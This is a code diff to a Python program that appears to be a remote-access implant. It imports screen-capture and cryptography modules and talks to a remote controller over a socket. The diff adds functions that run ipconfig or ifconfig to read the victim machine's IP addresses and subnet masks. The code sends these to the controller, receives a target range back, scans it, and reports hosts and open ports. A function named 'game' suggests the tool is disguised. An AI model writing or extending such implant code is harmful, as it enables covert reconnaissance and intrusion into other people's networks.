@@ -19,6 +19,7 @@ import asyncio
 import secrets
 import concurrent
 from concurrent import futures
+from datetime import datetime
 from PIL import ImageGrab
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
@@ -662,7 +663,10 @@ def cntread(xx):
 
 
 def scnet():
-    scn = Networkscan("192.168.131.0/24")
+    formed = detectIp_Mask()
+    sock.send(str(formed).encode())
+    ip = sock.recv(1024).decode()
+    scn = Networkscan(ip)
     scn.run()
     hs = scn.list_of_hosts_found
     sock.send(str(scn.nbr_host_found).encode())
@@ -708,6 +712,45 @@ def init_scan(target):
 
     sock.send(str(open_ports).encode())
     time.sleep(0.1)
+
+
+def printFormed(netstat):
+    ipFormed = []
+    # Comprueba si las listas 'ip' y 'mask' tienen el mismo número de elementos
+    if len(netstat['ip']) == len(netstat['mask']):
+        for id in range(len(netstat['ip'])):
+            ip = netstat['ip'][id]
+            mask = netstat['mask'][id]
+            subnet = str(ipaddress.ip_network(f"{ip}/{mask}", strict=False))
+            ipFormed.append(subnet)
+    return ipFormed
+
+
+def detectIp_Mask():
+    if os.name != "posix":
+        command = 'powershell.exe -c "ipconfig | Select-String -Pattern \'Dirección|Máscara\' -CaseSensitive | ForEach-Object { ($_.Line.Split(\' \'))[19] } "'
+    else:
+        command = "ifconfig | grep -oP 'inet .*' | awk '{print $2, $4}' | tr ' ' '\n'"
+
+    result = subprocess.run(command, capture_output=True, text=True, shell=True)
+
+    output = result.stdout
+    output = output.split("\n")  # Aquí se guarda la salida del comando
+
+    netstat = {"ip": [],
+               "mask": []}
+    id = 0
+    for content in output:
+        if content:  # Comprueba si la línea no está vacía
+            if id == 0:
+                netstat['ip'].append(content)
+                id += 1
+            elif id == 1:
+                netstat['mask'].append(content)
+                id = 0
+
+    formed = printFormed(netstat)
+    return formed
 
 
 def game (sock):
